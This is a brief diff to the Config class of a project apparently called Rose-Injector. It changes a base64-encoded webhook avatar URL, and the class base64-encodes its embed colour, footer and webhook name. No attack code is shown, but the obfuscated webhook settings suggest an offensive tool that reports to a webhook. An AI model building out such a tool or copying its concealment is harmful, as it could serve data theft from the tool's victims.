@@ -37,7 +37,7 @@ class Config:
         
         self.secr_eb_color = 'MTY3MTE2ODA='
         self.secr_eb_footer = 'Um9zZS1JbmplY3RvciB8IE1hZGUgYnkgR3VtYm9icm90LCBJQ0V4RlMsIHN1ZWdkdSBhbmQgeHBpZXJyb3ogfCBodHRwczovL2dpdGh1Yi5jb20vRGFtYWdpbmdSb3NlL1Jvc2UtSW5qZWN0b3I='
-        self.secr_wh_avatar = 'aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0RhbWFnaW5nUm9zZS9Sb3NlLUluamVjdG9yL21haW4vY29tcG9uZW50cy9yZWFkbWUvUm9zZVdCRy5wbmc='
+        self.secr_wh_avatar = 'aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0RhbWFnaW5nUm9zZS9Sb3NlLUluamVjdG9yL21haW4vY29tcG9uZW50cy9yZWFkbWUvJTI0cm9zZS13aC5wbmc='
         self.secr_wh_name = 'Um9zZS1JbmplY3Rvcg=='
         self.eb_color = int(base64.b64decode(self.secr_eb_color.encode('ascii')).decode('ascii'))
         self.eb_footer = base64.b64decode(self.secr_eb_footer.encode('ascii')).decode('ascii')
